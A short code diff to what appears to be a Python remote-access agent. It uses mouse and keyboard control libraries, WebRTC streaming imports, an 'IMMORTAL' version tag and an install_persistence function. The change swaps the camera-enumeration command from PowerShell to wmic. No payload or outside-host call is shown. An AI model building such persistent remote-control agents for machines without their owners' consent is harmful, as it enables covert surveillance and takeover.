@@ -18,10 +18,9 @@ from PIL import Image, ImageDraw, ImageFont
 from pynput.mouse import Controller as MouseController, Button
 from pynput.keyboard import Controller as KeyboardController, Key
 import av
-from aiortc import RTCPeerConnection, RTCSessionDescription, VideoStreamTrack, AudioStreamTrack, RTCRtpSender, RTCConfiguration, RTCIceServer
 from aiortc.contrib.media import MediaStreamTrack, MediaRelay
 
-AGENT_VERSION = "9.0.7-IMMORTAL"
+AGENT_VERSION = "9.0.8-IMMORTAL"
 
 def install_persistence():
     current_exe = sys.executable
@@ -157,8 +156,8 @@ def get_detailed_specs():
         except: pass
         
         try:
-            cam_output = subprocess.check_output('powershell -NoProfile -Command "Get-PnpDevice -Class Camera,Image -Status OK | Select-Object -ExpandProperty FriendlyName"', shell=True).decode()
-            cams = [n.strip() for n in cam_output.split('\n') if n.strip() and not n.startswith("FriendlyName")]
+            cam_output = subprocess.check_output('wmic path Win32_PnPEntity where "PNPClass=\'Camera\' OR PNPClass=\'Image\'" get name', shell=True).decode()
+            cams = [n.strip() for n in cam_output.split('\n') if n.strip() and n.strip().lower() != "name"]
         except:
             cams = []
             
